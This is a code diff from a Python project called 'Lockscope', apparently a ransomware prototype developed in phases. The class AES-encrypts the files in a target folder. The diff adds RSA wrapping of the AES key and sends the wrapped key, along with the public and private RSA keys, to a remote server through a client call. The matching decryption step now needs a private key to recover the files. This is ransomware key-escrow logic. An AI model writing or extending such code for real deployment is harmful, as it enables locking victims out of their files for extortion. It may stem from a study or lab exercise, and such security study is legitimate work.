@@ -1,6 +1,7 @@
 
 import pathlib
 import Server
+import Asymmetric
 
 from Crypto.Cipher import AES
 from Crypto import Random
@@ -13,10 +14,12 @@ class AEScipher:
     # Initialization of variables
     def __init__(self): 
         self.block_size = 32
-        self.key_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\key.pkl"
+        self.key_path = r"C:\Users\User\Desktop\Lockscope\Fase 4\key.pkl"
         self.files_path = pathlib.Path(r"C:\Users\User\Desktop\Test Files")
-        self.size_bytes_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\size_bytes.txt"
-        self.iv_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\iv.txt"
+        self.size_bytes_path = r"C:\Users\User\Desktop\Lockscope\Fase 4\size_bytes.txt"
+        self.iv_path = r"C:\Users\User\Desktop\Lockscope\Fase 4\iv.txt"
+        self.private_key_path =  r"C:\Users\User\Desktop\Lockscope\Fase 4\private_key.pem"
+        
 
     # Generate the AES key
     def generate_aes_key(self):
@@ -90,7 +93,13 @@ class AEScipher:
                 cipher_data = b'\x00'
                 rest_content = b'\x00'
 
-        Server.client(aes_key)
+        public_key, private_key = Asymmetric.generate_rsa_keys()
+
+        print("\n", public_key)
+        print("\n", private_key)
+        cipher_aes_key = Asymmetric.encrypt_aes_key(aes_key, public_key)
+
+        Server.client(cipher_aes_key,public_key,private_key)
         Server.receiver()
 
 
@@ -114,8 +123,13 @@ class AEScipher:
         
         print("\n-----DECRYPT FILE-----")
 
+        with open(self.private_key_path, "rb") as private_key_file:
+            private_key = private_key_file.read()
+        
         with open(self.key_path, "rb") as key_file:
-            aes_key = key_file.read()
+            cipher_aes_key = key_file.read()
+        
+        aes_key = Asymmetric.decrypt_aes_key(cipher_aes_key,private_key)
 
         with open(self.iv_path, "rb") as iv_file:
             iv = iv_file.read()
